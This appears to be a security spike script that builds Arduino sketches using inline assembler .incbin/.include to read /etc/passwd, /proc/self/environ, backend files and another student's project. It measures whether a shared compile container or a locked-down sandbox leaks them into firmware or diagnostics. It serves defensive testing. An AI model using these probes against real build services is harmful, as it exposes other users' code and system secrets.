// Spike P0.2 – file disclosure probes via inline assembler (.incbin/.include).
// "today" models the current backend: one long-running container that sees
// every project (and /app). "sandbox" is one locked-down container per compile
// that sees only its own project.
// Usage: node spikes/p0-2/attack.mjs <out.json>
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync, readFileSync, existsSync, chmodSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const IMAGE = process.env.IMAGE ?? "unosim-compile-sandbox-spike:p0-2";
const [outFile] = process.argv.slice(2);
const work = mkdtempSync(join(process.env.SPIKE_TMP ?? tmpdir(), "p02a-"));
const SECRET = "FOREIGN_SKETCH_SECRET_7f3a";
const APP_MARKER = "BACKEND_APP_MARKER_91c2";

// A foreign student's project and a backend file, visible to "today" only.
mkdirSync(join(work, "sk", "victim"), { recursive: true });
writeFileSync(join(work, "sk", "victim", "victim.ino"), `// ${SECRET}\nvoid setup(){}\nvoid loop(){}\n`);
mkdirSync(join(work, "app"), { recursive: true });
writeFileSync(join(work, "app", "package.json"), `{"name":"${APP_MARKER}"}\n`);

const targets = {
  "etc-passwd": "/etc/passwd",
  "app-package-json": "/app/package.json",
  "foreign-sketch": "/sk/victim/victim.ino",
  "proc-self-environ": "/proc/self/environ",
};
const probes = [];
for (const [tname, path] of Object.entries(targets)) {
  for (const directive of ["incbin", "include"]) {
    const name = `p_${directive}_${tname.replaceAll("-", "_")}`;
    mkdirSync(join(work, "sk", name), { recursive: true });
    const asm = directive === "incbin"
      ? `__asm__(".section .progmem.data\\n.global leak\\nleak: .incbin \\"${path}\\"\\n.byte 0\\n.text");\nextern const char leak[] __attribute__((progmem));`
      : `__asm__(".include \\"${path}\\"");\nextern const char leak[];`;
    writeFileSync(join(work, "sk", name, `${name}.ino`),
      `${asm}\nvoid setup(){ Serial.begin(9600); Serial.println((const __FlashStringHelper*)leak); }\nvoid loop(){}\n`);
    probes.push({ name, directive, target: tname, path });
  }
}
spawnSync("chmod", ["-R", "a+rX", work]);

const sandboxFlags = ["--rm", "--network", "none", "--read-only", "--cap-drop", "ALL",
  "--security-opt", "no-new-privileges", "--pids-limit", "128", "--memory", "512m", "--cpus", "2",
  "--tmpfs", "/tmp:rw,size=256m,mode=1777", "--label", "unosim.owner=spike-p0-2"];

function hexToBytes(hex) {
  const out = [];
  for (const line of hex.split(/\r?\n/)) {
    if (!line.startsWith(":")) continue;
    const b = Buffer.from(line.slice(1), "hex");
    if (b[3] === 0) out.push(b.subarray(4, 4 + b[0]));
  }
  return Buffer.concat(out);
}
const markers = { "etc-passwd": "root:x:0:0", "app-package-json": APP_MARKER, "foreign-sketch": SECRET, "proc-self-environ": "PATH=" };

function verdict(probe, code, output, flash) {
  const m = markers[probe.target];
  const inFlash = flash?.includes(m) ?? false;
  const inDiag = output.includes(m) || (probe.target === "etc-passwd" && /root:x/.test(output));
  return { exit: code, leakedIntoFlash: inFlash, leakedIntoDiagnostics: inDiag,
    diagnosticExcerpt: output.split("\n").filter((l) => /error|Error|No such|cannot/.test(l)).slice(0, 2).join(" | ").slice(0, 240) };
}

const results = [];
spawnSync("docker", ["rm", "-f", "p02-today"]);
spawnSync("docker", ["run", "-d", "--name", "p02-today", "--entrypoint", "sleep",
  "-v", `${join(work, "sk")}:/sk:ro`, "-v", `${join(work, "app")}:/app:ro`, IMAGE, "infinity"]);
try {
  for (const probe of probes) {
    for (const mode of ["today", "sandbox"]) {
      const out = join(work, "out", mode, probe.name);
      mkdirSync(out, { recursive: true });
      chmodSync(out, 0o777);
      let r;
      if (mode === "today") {
        r = spawnSync("docker", ["exec", "p02-today", "bash", "-c",
          `arduino-cli compile --fqbn arduino:avr:uno --build-path /tmp/b-${probe.name} --output-dir /tmp/o-${probe.name} /sk/${probe.name} 2>&1; rc=$?; cat /tmp/o-${probe.name}/${probe.name}.ino.hex > /dev/stderr 2>/dev/null; exit $rc`], { encoding: "utf8", maxBuffer: 64e6 });
      } else {
        r = spawnSync("docker", ["run", ...sandboxFlags, "-v", `${join(work, "sk", probe.name)}:/sketch/${probe.name}:ro`,
          "--entrypoint", "bash", IMAGE, "-c",
          `cp -a ~/.cache/arduino /tmp/cache && ARDUINO_BUILD_CACHE_PATH=/tmp/cache arduino-cli compile --fqbn arduino:avr:uno --output-dir /tmp/out /sketch/${probe.name} 2>&1; rc=$?; cat /tmp/out/${probe.name}.ino.hex > /dev/stderr 2>/dev/null; exit $rc`], { encoding: "utf8", maxBuffer: 64e6 });
      }
      const flash = r.status === 0 && r.stderr ? hexToBytes(r.stderr).toString("latin1") : null;
      const v = { mode, ...probe, ...verdict(probe, r.status, r.stdout, flash) };
      results.push(v);
      console.log(JSON.stringify({ mode, probe: probe.name, exit: v.exit, flash: v.leakedIntoFlash, diag: v.leakedIntoDiagnostics }));
    }
  }
} finally {
  spawnSync("docker", ["rm", "-f", "p02-today"]);
  rmSync(work, { recursive: true, force: true });
}
writeFileSync(outFile, JSON.stringify(results, null, 2));
